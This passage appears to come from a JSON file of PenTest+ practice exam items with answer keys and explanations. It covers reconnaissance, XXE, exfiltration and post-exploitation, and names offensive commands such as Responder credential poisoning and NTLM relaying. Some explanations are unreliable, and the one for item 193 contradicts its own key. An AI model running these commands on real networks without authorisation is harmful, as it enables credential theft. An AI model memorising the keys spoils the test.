      "D": "Implement a WAF to filter all incoming requests"
    },
    "correct_answer": "C",
    "explanation": "This is an XML External Entity (XXE) attack, which occurs when an application processes XML input that \nallows external entity references. The best mitigation is to disable external entities in the XML parser.\n\nOption A (Change file permissions) #: Changing file permissions does not fix the root cause, as the \nvulnerability is in XML processing.\n\nOption B (Review logs) #: Logs help with detection, but do not prevent XXE attacks.\n\nOption C (Disable external entities) #: Correct.\n\nDisabling external entity resolution in the XML parser prevents XXE attacks.\n\nOption D (WAF) #: A WAF can help block attacks, but disabling external entities is the best solution.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Web Application Attacks (XXE)",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
    {
      "question_number": 32,
      "question_text": "A penetration tester completed OSINT work and needs to identify all subdomains for mydomain.com. Which of the following is the best command for the tester to use?",
      "options": {
        "A": "nslookup mydomain.com » /path/to/results.txt",
        "B": "crunch 1 2 | xargs -n 1 -I 'X' nslookup X.mydomain.com",
        "C": "dig @8.8.8.8 mydomain.com ANY » /path/to/results.txt",
        "D": "cat wordlist.txt | xargs -n 1 -I 'X' dig X.mydomain.com"
      },
      "correct_answer": "D",
      "explanation": "Using dig with a wordlist to identify subdomains is an effective method for subdomain enumeration. The \ncommand cat wordlist.txt | xargs -n 1 -I 'X' dig X.mydomain.com reads each line from wordlist.txt and \nperforms a DNS lookup for each potential subdomain.\n\nCommand Breakdown:\n\ncat wordlist.txt: Reads the contents of wordlist.txt, which contains a list of potential subdomains.\n\nxargs -n 1 -I 'X': Takes each line from wordlist.txt and passes it to dig one at a time.\n\ndig X.mydomain.com: Performs a DNS lookup for each subdomain.\n\nWhy This is the Best Choice:\n\nEfficiency: xargs efficiently processes each line from the wordlist and passes it to dig for DNS \nresolution.\n\nAutomation: Automates the enumeration of subdomains, making it a practical choice for large \nlists.\n\nBenefits:\n\nAutomates the process of subdomain enumeration using a wordlist.\n\nEfficiently handles a large number of subdomains.\n\nReferences from Pentesting Literature:\n\nSubdomain enumeration is a critical part of the reconnaissance phase in penetration testing. Tools \nlike dig and techniques involving wordlists are commonly discussed in penetration testing guides.\n\nHTB write-ups often detail the use of similar commands for efficient subdomain enumeration.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups\n=================",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 40,
      "question_text": "A penetration tester is getting ready to conduct a vulnerability scan as part of the testing process. The tester will evaluate an environment that consists of a container orchestration cluster. Which of the following tools should the tester use to evaluate the cluster?",
      "options": {
        "A": "Trivy",
        "B": "Nessus",
        "C": "Grype",
        "D": "Kube-hunter"
      },
      "correct_answer": "D",
      "explanation": "Evaluating a container orchestration cluster, such as Kubernetes, requires specialized tools designed to assess \nthe security and configuration of container environments. Here’s an analysis of each tool and why Kube hunter is the best choice:\n\nTrivy (Option A):\n\nExplanation: Trivy is a vulnerability scanner for container images and filesystem.\n\nCapabilities: While effective at scanning container images for vulnerabilities, it is not specifically \ndesigned to assess the security of a container orchestration cluster itself.\n\nNessus (Option B):\n\nExplanation: Nessus is a general-purpose vulnerability scanner that can assess network devices, \noperating systems, and applications.\n\nCapabilities: It is not tailored for container orchestration environments and may miss specific \nissues related to Kubernetes or other orchestration systems.\n\nGrype (Option C):\n\nExplanation: Grype is a vulnerability scanner for container images.\n\nCapabilities: Similar to Trivy, it focuses on identifying vulnerabilities in container images rather \nthan assessing the overall security posture of a container orchestration cluster.\n\nKube-hunter (Answer: D):\n\nExplanation: Kube-hunter is a tool specifically designed to hunt for security vulnerabilities in \nKubernetes clusters.\n\nCapabilities: It scans the Kubernetes cluster for a wide range of security issues, including \nmisconfigurations and vulnerabilities specific to Kubernetes environments.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 27,
      "question_text": "A penetration tester is compiling the final report for a recently completed engagement. A junior QA team member wants to know where they can find details on the impact, overall security findings, and high-level statements. Which of the following sections of the report would most likely contain this information?",
      "options": {
        "A": "Quality control",
        "B": "Methodology",
        "C": "Executive summary",
        "D": "Risk scoring"
      },
      "correct_answer": "C",
      "explanation": "In the final report for a penetration test engagement, the section that most likely contains details on the \nimpact, overall security findings, and high-level statements is the executive summary. Here’s why:\n\nPurpose of the Executive Summary:\n\nIt provides a high-level overview of the penetration test findings, including the most critical \nissues, their impact on the organization, and general recommendations.\n\nIt is intended for executive management and other non-technical stakeholders who need to \nunderstand the security posture without delving into technical details.\n\nContents of the Executive Summary:\n\nImpact: Discusses the potential business impact of the findings.\n\nOverall Security Findings: Summarizes the key vulnerabilities identified during the engagement.\n\nHigh-Level Statements: Provides strategic recommendations and a general assessment of the \nsecurity posture.\n\nComparison to Other Sections:\n\nQuality Control: Focuses on the measures taken to ensure the accuracy and quality of the testing \nprocess.\n\nMethodology: Details the approach and techniques used during the penetration test.\n\nRisk Scoring: Provides detailed risk assessments and scoring for specific vulnerabilities but does \nnot offer a high-level overview suitable for executives.\n=================",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 204,
      "question_text": "A penetration tester assesses a complex web application and wants to explore potential security weaknesses by searching for subdomains that might have existed in the past. Which of the following tools should the penetration tester use?",
      "options": {
        "A": "Censys.io",
        "B": "Shodan",
        "C": "Wayback Machine",
        "D": "SpiderFoot"
      },
      "correct_answer": "C",
      "explanation": "The Wayback Machine is an online tool that archives web pages over time, allowing users to see how a \nwebsite looked at various points in its history. This can be extremely useful for penetration testers looking to \nexplore potential security weaknesses by searching for subdomains that might have existed in the past.\n\nAccessing the Wayback Machine:\n\nGo to the Wayback Machine website: archive.org/web.\n\nEnter the URL of the target website you want to explore.\n\nNavigating Archived Pages:\n\nThe Wayback Machine provides a timeline and calendar interface to browse through different \nsnapshots taken over time.\n\nSelect a snapshot to view the archived version of the site. Look for links, subdomains, and \nresources that may no longer be available in the current version of the website.\n\nIdentifying Subdomains:\n\nExamine the archived pages for references to subdomains, which might be visible in links, \nscripts, or embedded content.\n\nUse the information gathered to identify potential entry points or older versions of web \napplications that might still be exploitable.\n\nTool Integration:\n\nTools like Burp Suite or SpiderFoot can integrate with the Wayback Machine to automate the \ndiscovery process of archived subdomains and resources.\n\nReal-World Example:\n\nDuring a penetration test, a tester might find references to oldadmin.targetsite.com in an archived \npage from several years ago. This subdomain might no longer be listed in DNS but could still be \naccessible, leading to potential security vulnerabilities.\n\nReferences from Pentesting Literature:\n\nIn various penetration testing guides and HTB write-ups, using the Wayback Machine is a \ncommon technique for passive reconnaissance, providing historical context and revealing past \nconfigurations that might still be exploitable.\n\nStep-by-Step ExplanationReferences:\n\nHTB Official Writeups\n=================",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 163,
      "question_text": "A penetration tester wants to use the following Bash script to identify active servers on a network:\n1 network_addr=\"192.168.1\"\n2 for h in {1..254}; do\n3 ping -c 1 -W 1 $network_addr.$h > /dev/null\n4 if [ $? -eq 0 ]; then\n5 echo \"Host $h is up\"\n6 else\n7 echo \"Host $h is down\"\n8 fi\n9 done\nWhich of the following should the tester do to modify the script?",
      "options": {
        "A": "Change the condition on line 4.",
        "B": "Add 2>&1 at the end of line 3.",
        "C": "Use seq on the loop on line 2.",
        "D": "Replace $h with ${h} on line 3."
      },
      "correct_answer": "C",
      "explanation": "The provided Bash script is used to ping a range of IP addresses to identify active hosts in a network. Here's a \ndetailed breakdown of the script and the necessary modification:\n\nOriginal Script:\n\n1 network_addr=\"192.168.1\"\n2 for h in {1..254}; do\n3 ping -c 1 -W 1 $network_addr.$h > /dev/null\n4 if [ $? -eq 0 ]; then\n5 echo \"Host $h is up\"\n6 else\n7 echo \"Host $h is down\"\n8 fi\n9 done\n\nAnalysis:\n\nLine 2: The loop uses {1..254} to iterate over the range of host addresses. However, this notation \nmight not work in all shell environments, especially if not using bash directly or if the script runs \nin a different shell.\n\nUsing seq for Better Compatibility:\n\nThe seq command is a more compatible way to generate a sequence of numbers. It ensures the \nloop works in any POSIX-compliant shell.\n\nModified Line 2:\n\nfor h in $(seq 1 254); do\n\nThis change ensures broader compatibility and reliability of the script.\n\nModified Script:\n\n1 network_addr=\"192.168.1\"\n2 for h in $(seq 1 254); do\n3 ping -c 1 -W 1 $network_addr.$h > /dev/null\n4 if [ $? -eq 0 ]; then\n5 echo \"Host $h is up\"\n6 else\n7 echo \"Host $h is down\"\n8 fi\n9 done",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 233,
      "question_text": "A penetration tester needs to collect information over the network for further steps in an internal assessment. Which of the following would most likely accomplish this goal?",
      "options": {
        "A": "ntlmrelayx.py -t 192.168.1.0/24 -1 1234",
        "B": "nc -tulpn 1234 192.168.1.2",
        "C": "responder.py -I eth0 -wP",
        "D": "crackmapexec smb 192.168.1.0/24"
      },
      "correct_answer": "C",
      "explanation": "To collect information over the network, especially during an internal assessment, tools that can capture and \nanalyze network traffic are essential. Responder is specifically designed for this purpose, and it can capture \nNTLM hashes and other credentials by poisoning various network protocols. Here’s a breakdown of the \noptions:\n\nOption A: ntlmrelayx.py -t 192.168.1.0/24 -1 1234\n\nntlmrelayx.py is used for relaying NTLM authentication but not for broad network information \ncollection.\n\nOption B: nc -tulpn 1234 192.168.1.2\n\nNetcat (nc) is a network utility for reading from and writing to network connections using TCP or \nUDP but is not specifically designed for comprehensive information collection over a network.\n\nOption C: responder.py -I eth0 -wP\n\nResponder is a tool for LLMNR, NBT-NS, and MDNS poisoning. The -I eth0 option specifies the \nnetwork interface, and -wP enables WPAD rogue server which is effective for capturing network \ncredentials and other information.\n\nOption D: crackmapexec smb 192.168.1.0/24\n\nCrackMapExec is useful for SMB-related enumeration and attacks but not specifically for broad \nnetwork information collection.\n\nReferences from Pentest:\n\nAnubis HTB: Highlights the use of Responder to capture network credentials and hashes during internal \nassessments.\n\nHorizontall HTB: Demonstrates the effectiveness of Responder in capturing and analyzing network \ntraffic for further exploitation.\n=================",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 206,
      "question_text": "During a penetration testing engagement, a tester targets the internet-facing services used by the client. Which of the following describes the type of assessment that should be considered in this scope of work?",
      "options": {
        "A": "Segmentation",
        "B": "Mobile",
        "C": "External",
        "D": "Web"
      },
      "correct_answer": "C",
      "explanation": "An external assessment focuses on testing the security of internet-facing services. Here’s why option C is \ncorrect:\n\nExternal Assessment: It involves evaluating the security posture of services exposed to the internet, \nsuch as web servers, mail servers, and other public-facing infrastructure. The goal is to identify \nvulnerabilities that could be exploited by attackers from outside the organization’s network.\n\nSegmentation: This type of assessment focuses on ensuring that different parts of a network are \nappropriately segmented to limit the spread of attacks. It’s more relevant to internal network \narchitecture.\n\nMobile: This assessment targets mobile applications and devices, not general internet-facing services.\n\nWeb: While web assessments focus on web applications, the scope of an external assessment is broader \nand includes all types of internet-facing services.\n\nReferences from Pentest:\n\nHorizontall HTB: Highlights the importance of assessing external services to identify vulnerabilities \nthat could be exploited from outside the network.\n\nLuke HTB: Demonstrates the process of evaluating public-facing services to ensure their security.\n\nConclusion:\nOption C, External, is the most appropriate type of assessment for targeting internet-facing services used by \nthe client.\n=================",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 174,
      "question_text": "In a cloud environment, a security team discovers that an attacker accessed confidential information that was used to configure virtual machines during their initialization. Through which of the following features could this information have been accessed?",
      "options": {
        "A": "IAM",
        "B": "Block storage",
        "C": "Virtual private cloud",
        "D": "Metadata services"
      },
      "correct_answer": "D",
      "explanation": "In a cloud environment, the information used to configure virtual machines during their initialization could \nhave been accessed through metadata services.\n\nMetadata Services:\n\nDefinition: Cloud service providers offer metadata services that provide information about the \nrunning instance, such as instance ID, hostname, network configurations, and user data.\n\nAccess: These services are accessible from within the virtual machine and often include sensitive \ninformation used during the initialization and configuration of the VM.\n\nOther Features:\n\nIAM (Identity and Access Management): Manages permissions and access to resources but does \nnot directly expose initialization data.\n\nBlock Storage: Provides persistent storage but does not directly expose initialization data.\n\nVirtual Private Cloud (VPC): Provides network isolation for cloud resources but does not directly \nexpose initialization data.\n\nPentest References:\n\nCloud Security: Understanding how metadata services work and the potential risks associated with \nthem is crucial for securing cloud environments.\n\nExploitation: Metadata services can be exploited to retrieve sensitive data if not properly secured.\nBy accessing metadata services, an attacker can retrieve sensitive configuration information used during VM \ninitialization, which can lead to further exploitation.\n=================",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 134,
      "question_text": "A penetration tester is testing a power plant's network and needs to avoid disruption to the grid. Which of the following methods is most appropriate to identify vulnerabilities in the network?",
      "options": {
        "A": "Configure a network scanner engine and execute the scan.",
        "B": "Execute a testing framework to validate vulnerabilities on the devices.",
        "C": "Configure a port mirror and review the network traffic.",
        "D": "Run a network mapper tool to get an understanding of the devices."
      },
      "correct_answer": "C",
      "explanation": "When testing a power plant's network and needing to avoid disruption to the grid, configuring a port mirror \nand reviewing the network traffic is the most appropriate method to identify vulnerabilities without causing \ndisruptions.\n\nPort Mirroring:\n\nDefinition: Port mirroring (SPAN - Switched Port Analyzer) is a method of monitoring network \ntraffic by duplicating packets from one or more switch ports to another port where a monitoring \ndevice is connected.\n\nPurpose: Allows passive monitoring of network traffic without impacting network operations or \ndevice performance.\n\nAvoiding Disruption:\n\nNon-Intrusive: Port mirroring is non-intrusive and does not generate additional traffic or load on \nthe network devices, making it suitable for sensitive environments like power plants where \ndisruption is not acceptable.\n\nOther Options:\n\nNetwork Scanner Engine: Active scanning might disrupt network operations or devices, which is \nnot suitable for critical infrastructure.\n\nTesting Framework: Validating vulnerabilities on devices might involve active testing, which can \nbe disruptive.\n\nNetwork Mapper Tool: Running a network mapper tool (like Nmap) actively scans the network \nand might disrupt services.\n\nPentest References:\n\nPassive Monitoring: Passive techniques such as port mirroring are essential in environments where \nmaintaining operational integrity is critical.\n\nCritical Infrastructure Security: Understanding the need for non-disruptive methods in critical \ninfrastructure penetration testing to ensure continuous operations.\n\nBy configuring a port mirror and reviewing network traffic, the penetration tester can identify vulnerabilities \nin the power plant's network without risking disruption to the grid.\n=================",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 113,
      "question_text": "A penetration tester needs to identify all vulnerable input fields on a customer website. Which of the following tools would be best suited to complete this request?",
      "options": {
        "A": "DAST",
        "B": "SAST",
        "C": "IAST",
        "D": "SCA"
      },
      "correct_answer": "A",
      "explanation": "Dynamic Application Security Testing (DAST):\n\nDAST tools interact with the running application from the outside, simulating attacks to identify \nsecurity vulnerabilities.\n\nThey are particularly effective in identifying issues like SQL injection, XSS, CSRF, and other \nvulnerabilities in web applications.\n\nDAST tools do not require access to the source code, making them suitable for black-box testing.\n\nAdvantages of DAST:\n\nReal-World Testing: DAST simulates real-world attacks by interacting with the application in the \nsame way a user would.\n\nComprehensive Coverage: Can identify vulnerabilities in all parts of the web application, \nincluding input fields, forms, and user interactions.\n\nAutomated Scanning: Automates the process of testing and identifying vulnerabilities, providing \ndetailed reports on discovered issues.\n\nExamples of DAST Tools:\n\nOWASP ZAP (Zed Attack Proxy): An open-source DAST tool widely used for web application \nsecurity testing.\n\nBurp Suite: A popular commercial DAST tool that provides comprehensive scanning and testing \ncapabilities.\n\nPentest References:\n\nWeb Application Testing: Understanding the importance of testing web applications for security \nvulnerabilities and the role of different testing methodologies.\n\nSecurity Testing Tools: Familiarity with various security testing tools and their applications in \npenetration testing.\n\nDAST vs. SAST: Knowing the difference between DAST (dynamic testing) and SAST (static testing) \nand when to use each method.\n\nBy using a DAST tool, the penetration tester can effectively identify all vulnerable input fields on the \ncustomer website, ensuring a thorough assessment of the application's security.\n=================",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 159,
      "question_text": "Which of the following is the most efficient way to exfiltrate a file containing data that could be \nsensitive?",
      "options": {
        "A": "Use steganography and send the file over FTP.",
        "B": "Compress the file and send it using TFTP.",
        "C": "Split the file in tiny pieces and send it over dnscat.",
        "D": "Encrypt and send the file over HTTPS."
      },
      "correct_answer": "D",
      "explanation": "Enviar un archivo cifrado por HTTPS es el método más eficiente, seguro y menos sospechoso para exfiltrar \ndatos. HTTPS cifra el contenido y es un protocolo común que no genera tantas alertas en los sistemas de \nmonitoreo.\n\nOtras opciones como dnscat son más sigilosas pero menos eficientes y requieren control sobre la \ninfraestructura. Steganografía o TFTP pueden ser útiles, pero FTP/TFTP son inseguros y poco usados \nactualmente, lo cual los hace más sospechosos.\n\nReferencia: PT0-003 Objective 4.3 – Explain post-exploitation techniques, including data exfiltration \nmethods.",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 203,
      "question_text": "A penetration tester attempts unauthorized entry to the company's server room as part of a security \nassessment. Which of the following is the best technique to manipulate the lock pins and open the door \nwithout the original key?",
      "options": {
        "A": "Plug spinner",
        "B": "Bypassing",
        "C": "Decoding",
        "D": "Raking"
      },
      "correct_answer": "D",
      "explanation": "Lock picking techniques are used in physical security assessments to test access control mechanisms.\n\nRaking (Option D):\n\nRaking is a lock-picking technique where a rake pick is inserted and rapidly moved in and out to \nmanipulate multiple pins simultaneously.\n\nIt is faster but less precise than single-pin picking.\n\nUsed when speed is prioritized over precision.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 100,
      "question_text": "A client recently hired a penetration testing firm to conduct an assessment of their consumer-facing web \napplication. Several days into the assessment, the client’s networking team observes a substantial increase in \nDNS traffic. Which of the following would most likely explain the increase in DNS traffic?",
      "options": {
        "A": "Covert data exfiltration",
        "B": "URL spidering",
        "C": "HTML scraping",
        "D": "DoS attack"
      },
      "correct_answer": "A",
      "explanation": "An increase in DNS traffic during a penetration test suggests data exfiltration using DNS tunneling, a method \nwhere attackers encode data into DNS queries to avoid detection.\n\nOption A (Covert data exfiltration) #: Correct. DNS tunneling (e.g., dnscat2, Iodine) is a stealthy \nmethod to bypass firewalls and extract sensitive data.\n\nOption B (URL spidering) #: Would cause increased web traffic, not DNS requests.\n\nOption C (HTML scraping) #: Involves parsing web pages, not DNS traffic.\n\nOption D (DoS attack) #: DoS floods bandwidth or servers, but does not increase DNS queries \nsignificantly.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – DNS Tunneling & Data Exfiltration",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 13,
      "question_text": "A penetration tester cannot complete a full vulnerability scan because the client's WAF is blocking \ncommunications. During which of the following activities should the penetration tester discuss this issue with \nthe client?",
      "options": {
        "A": "Goal reprioritization",
        "B": "Peer review",
        "C": "Client acceptance",
        "D": "Stakeholder alignment"
      },
      "correct_answer": "D",
      "explanation": "Stakeholder Alignment:\n\nDuring stakeholder alignment, the penetration tester and client discuss challenges, constraints, \nand objectives.\n\nAddressing WAF interference ensures the scope and goals are adjusted or mitigated to \naccommodate the issue.\n\nWhy Not Other Options?\n\nA: Goal reprioritization focuses on internal team adjustments, not client collaboration.\n\nB: Peer review evaluates findings and methodologies but doesn’t involve clients.\n\nC: Client acceptance occurs post-assessment, not during active engagement.\n\nCompTIA Pentest+ References:\n\nDomain 1.0 (Planning and Scoping)",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 193,
      "question_text": "A penetration tester is working on an engagement in which a main objective is to collect confidential information that could be used to exfiltrate data and perform a ransomware attack. During the engagement, the tester is able to obtain an internal foothold on the target network. Which of the following is the next task the tester should complete to accomplish the objective?",
      "options": {
        "A": "Initiate a social engineering campaign.",
        "B": "Perform credential dumping.",
        "C": "Compromise an endpoint.",
        "D": "Share enumeration."
      },
      "correct_answer": "D",
      "explanation": "Given that the penetration tester has already obtained an internal foothold on the target network, the next \nlogical step to achieve the objective of collecting confidential information and potentially exfiltrating data or \nperforming a ransomware attack involves further enumeration and potential credential gathering. The explanation below details the usual steps, though the provided answer selects Share Enumeration.\n\nCredential Dumping:\n\nPurpose: Credential dumping involves extracting password hashes and plaintext passwords from \ncompromised systems. These credentials can be used to gain further access to sensitive data and \ncritical systems within the network.\n\nTools: Common tools used for credential dumping include Mimikatz, Windows Credential \nEditor, and ProcDump.\n\nImpact: With these credentials, the tester can move laterally across the network, escalate \nprivileges, and access confidential information.\n\nComparison with Other Options:\n\nInitiate a Social Engineering Campaign (A): Social engineering is typically an initial access \ntechnique rather than a follow-up action after gaining internal access.\n\nCompromise an Endpoint (C): The tester already has a foothold, so compromising another \nendpoint is less direct than credential dumping for accessing sensitive information.\n\nShare Enumeration (D): While share enumeration can provide useful information (like potential locations of sensitive files), it is generally considered less impactful than credential dumping in terms of gaining further access and achieving the main objective of accessing widespread confidential information for exfiltration/ransomware. However, it is a valid reconnaissance step after gaining a foothold.\n\nNote: While the explanation might lean towards credential dumping (B) as the *most* effective step for escalation and broad access, Share Enumeration (D) is a valid next step for reconnaissance and finding data, and is the marked answer.",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 82,
      "question_text": "During a vulnerability assessment, a penetration tester configures the scanner sensor and performs the initial vulnerability scanning under the client's internal network. The tester later discusses the results with the client, but the client does not accept the results. The client indicates the host and assets that were within scope are not included in the vulnerability scan results. Which of the following should the tester have done?",
      "options": {
        "A": "Rechecked the scanner configuration.",
        "B": "Performed a discovery scan.",
        "C": "Used a different scan engine.",
        "D": "Configured all the TCP ports on the scan."
      },
      "correct_answer": "B",
      "explanation": "When the client indicates that the scope's hosts and assets are not included in the vulnerability scan results, it \nsuggests that the tester may have missed discovering all the devices in the scope. Here’s the best course of \naction:\n\nPerforming a Discovery Scan:\n\nPurpose: A discovery scan identifies all active devices on the network before running a detailed \nvulnerability scan. It ensures that all in-scope devices are included in the assessment.\n\nProcess: The discovery scan uses techniques like ping sweeps, ARP scans, and port scans to \nidentify active hosts and services.\n\nComparison with Other Actions:\n\nRechecking the Scanner Configuration (A): Useful but not as comprehensive as ensuring all hosts \nare discovered.\n\nUsing a Different Scan Engine (C): Not necessary if the issue is with host discovery rather than \nthe scanner’s capability.\n\nConfiguring All TCP Ports on the Scan (D): Helps in detailed scanning but does not address \nmissing hosts.\n\nPerforming a discovery scan ensures that all in-scope devices are identified and included in the vulnerability \nassessment, making it the best course of action.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 178,
      "question_text": "A penetration tester is working on a security assessment of a mobile application that was developed in-house for local use by a hospital. The hospital and its customers are very concerned about disclosure of information. Which of the following tasks should the penetration tester do first?",
      "options": {
        "A": "Set up Drozer in order to manipulate and scan the application.",
        "B": "Run the application through the mobile application security framework.",
        "C": "Connect Frida to analyze the application at runtime to look for data leaks.",
        "D": "Load the application on client-owned devices for testing."
      },
      "correct_answer": "B",
      "explanation": "When performing a security assessment on a mobile application, especially one concerned with information \ndisclosure, it is crucial to follow a structured approach to identify vulnerabilities comprehensively. Here’s \nwhy option B is correct:\n\nMobile Application Security Framework: This framework provides a structured methodology for \nassessing the security of mobile applications. It includes various tests such as static analysis, dynamic \nanalysis, and reverse engineering, which are essential for identifying vulnerabilities related to \ninformation disclosure.\n\nInitial Steps: Running the application through a security framework allows the tester to identify a broad \nrange of potential issues systematically. This initial step ensures that all aspects of the application's \nsecurity are covered before delving into more specific tools like Drozer or Frida.\n\nReferences from Pentest:\n\nWriteup HTB: Demonstrates the use of structured methodologies to ensure comprehensive coverage of \nsecurity assessments.\n\nHorizontall HTB: Emphasizes the importance of following a structured approach to identify and \naddress security issues.",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 70,
      "question_text": "A penetration tester is unable to identify the Wi-Fi SSID on a client’s cell phone.\nWhich of the following techniques would be most effective to troubleshoot this issue?",
      "options": {
        "A": "Sidecar scanning",
        "B": "Channel scanning",
        "C": "Stealth scanning",
        "D": "Static analysis scanning"
      },
      "correct_answer": "B",
      "explanation": "Since SSID broadcast might be hidden, channel scanning allows the tester to identify active Wi-Fi networks.\n\nOption A (Sidecar scanning) #: Not a recognized Wi-Fi testing method.\n\nOption B (Channel scanning) #: Correct.\n\nIdentifies hidden SSIDs by monitoring probe requests and responses.\n\nOption C (Stealth scanning) #: Typically refers to evading detection, not Wi-Fi analysis.\n\nOption D (Static analysis scanning) #: Static analysis applies to code security, not Wi-Fi networks.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Wireless Reconnaissance Techniques",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 56,
      "question_text": "Given the following statements:\nImplement a web application firewall.\nUpgrade end-of-life operating systems.\nImplement a secure software development life cycle.\nIn which of the following sections of a penetration test report would the above statements be found?",
      "options": {
        "A": "Executive summary",
        "B": "Attack narrative",
        "C": "Detailed findings",
        "D": "Recommendations"
      },
      "correct_answer": "D",
      "explanation": "The given statements are actionable steps aimed at improving security. They fall under the recommendations \nsection of a penetration test report. Here’s why option D is correct:\n\nRecommendations: This section of the report provides specific actions that should be taken to mitigate \nidentified vulnerabilities and improve the overall security posture. Implementing a WAF, upgrading \noperating systems, and implementing a secure SDLC are recommendations to enhance security.\n\nExecutive Summary: This section provides a high-level overview of the findings and their implications, \nintended for executive stakeholders.\n\nAttack Narrative: This section details the steps taken during the penetration test, describing the attack \nvectors and methods used.\n\nDetailed Findings: This section provides an in-depth analysis of each identified vulnerability, including \nevidence and technical details.\n\nReferences from Pentest:\n\nForge HTB: The report's recommendations section suggests specific measures to address the identified \nissues, similar to the given statements.\n\nWriteup HTB: Highlights the importance of the recommendations section in providing actionable steps \nto improve security based on the findings from the assessment.\n\nConclusion:\n\nOption D, recommendations, is the correct section where the given statements would be found in a penetration \ntest report.\n=================",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 219,
      "question_text": "While conducting a reconnaissance activity, a penetration tester extracts the following information:\nEmails: - admin@acme.com - sales@acme.com - support@acme.com\nWhich of the following risks should the tester use to leverage an attack as the next step in the security assessment?",
      "options": {
        "A": "Unauthorized access to the network",
        "B": "Exposure of sensitive servers to the internet",
        "C": "Likelihood of SQL injection attacks",
        "D": "Indication of a data breach in the company"
      },
      "correct_answer": "A",
      "explanation": "When a penetration tester identifies email addresses during reconnaissance, the most immediate risk to \nleverage for an attack is unauthorized access to the network. Here’s why:\n\nPhishing Attacks:\n\nEmail addresses are often used to conduct phishing attacks. By crafting a convincing email, an \nattacker can trick the recipient into revealing their login credentials or downloading malicious \nsoftware, thereby gaining unauthorized access to the network.\n\nSpear Phishing:\n\nWith specific email addresses (like admin@acme.com), attackers can perform spear phishing, \ntargeting key individuals within the organization to gain access to more sensitive parts of the \nnetwork.\n\nComparison with Other Risks:\n\nExposure of sensitive servers to the internet (B): This is unrelated to the email addresses and \nmore about network configuration.\n\nLikelihood of SQL injection attacks (C): SQL injection targets web applications and databases, \nnot email addresses.\n\nIndication of a data breach in the company (D): The presence of email addresses alone does not \nindicate a data breach.\n\nEmail addresses are a starting point for phishing attacks, making unauthorized access to the network the most \nrelevant risk.\n=================",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 135,
      "question_text": "A penetration tester performs several Nmap scans against the web application for a client.\nINSTRUCTIONS\nClick on the WAF and servers to review the results of the Nmap scans. Then click on\neach tab to select the appropriate vulnerability and remediation options.\nIf at any time you would like to bring back the initial state of the simulation, please\nclick the Reset All button.",
      "options": null,
      "correct_answer": null,
      "explanation": "Most likely vulnerability: Perform a SSRF attack against App01.example.com from CDN.example.com.\nThe scenario suggests that the CDN network (with a WAF) can be used to perform a Server-Side Request \nForgery (SSRF) attack. Since the penetration tester has the pentester workstation interacting through the CDN\n/WAF and the production network is behind it, the most plausible attack vector is to exploit SSRF to interact \nwith the internal services like App01.example.com.\n\nTwo best remediation options:\nRequire an additional authentication header value between CDN.example.com and App01.example.com.\nRestrict direct communications to App01.example.com to only approved components.\n\nRestrict direct communications to App01.example.com to only approved components: This limits the \nexposure of the application server by ensuring that only specified, trusted entities can communicate \nwith it.\n\nRequire an additional authentication header value between CDN.example.com and App01.example.\ncom: Adding an authentication layer between the CDN and the app server helps ensure that requests are \nlegitimate and originate from trusted sources, mitigating SSRF and other indirect attack vectors.\n\nNmap Scan Observations:\nCDN/WAF shows open ports for HTTP and HTTPS but filtered for MySQL, indicating it acts as a \nfiltering layer.\nApp Server has open ports for HTTP, HTTPS, and filtered for MySQL.\nDB Server has all ports filtered, typical for a database server that should not be directly accessible.\n\nThese findings align with the SSRF vulnerability and the appropriate remediation steps to enhance the \nsecurity of internal communications.",
      "is_simulation": true,
